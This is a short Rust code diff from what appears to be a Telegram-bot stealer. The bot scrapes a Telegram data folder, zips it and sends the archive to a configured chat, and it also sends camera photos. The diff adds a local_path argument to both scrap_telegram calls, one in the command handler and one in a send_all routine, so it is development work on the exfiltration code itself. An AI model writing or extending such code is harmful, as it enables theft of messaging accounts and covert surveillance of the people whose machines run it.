@@ -34,7 +34,7 @@ async fn answer(bot: Bot, _msg: Message, cmd: Command) -> ResponseResult<()> {
             }
         }
         Command::Telegram => {
-            match scrapper::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path){
+            match scrapper::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
                 Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
                 Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
             }
@@ -70,7 +70,7 @@ pub async fn send_all(bot: &Bot){
             Ok(_) => {let _ = bot.send_photo(cfg.chat_id.clone(), InputFile::file(&cfg.camera_path)).await;}
             Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
         }},
-        async { match scrapper::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path){
+        async { match scrapper::scrap_telegram(&cfg.telegram_path, &cfg.telegram_zip_path, &cfg.local_path){
             Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
             Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
         }}
